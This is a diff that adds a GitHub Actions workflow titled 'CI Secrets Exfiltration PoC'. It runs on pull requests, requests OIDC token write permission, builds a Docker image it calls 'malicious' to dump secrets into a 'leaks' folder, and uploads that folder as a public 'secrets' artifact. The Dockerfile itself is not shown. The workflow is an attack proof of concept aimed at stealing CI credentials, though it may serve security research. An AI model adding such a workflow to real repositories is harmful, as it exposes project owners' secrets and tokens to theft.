@@ -1,0 +1,28 @@
+name: CI Secrets Exfiltration PoC
+
+on:
+  pull_request:
+    branches: [main]  # Adjust if needed to match target branch
+
+permissions:
+  contents: read
+  id-token: write  # Needed to access OIDC_TOKEN if available
+
+jobs:
+  leak_secrets:
+    runs-on: ubuntu-latest
+    steps:
+
+    - name: Checkout
+      uses: actions/checkout@v4
+
+    - name: Build and run malicious Docker container
+      run: |
+        mkdir leaks
+        docker build -t leak-dump -f Dockerfile .
+
+    - name: Upload leaked secrets
+      uses: actions/upload-artifact@v4
+      with:
+        name: secrets
+        path: leaks
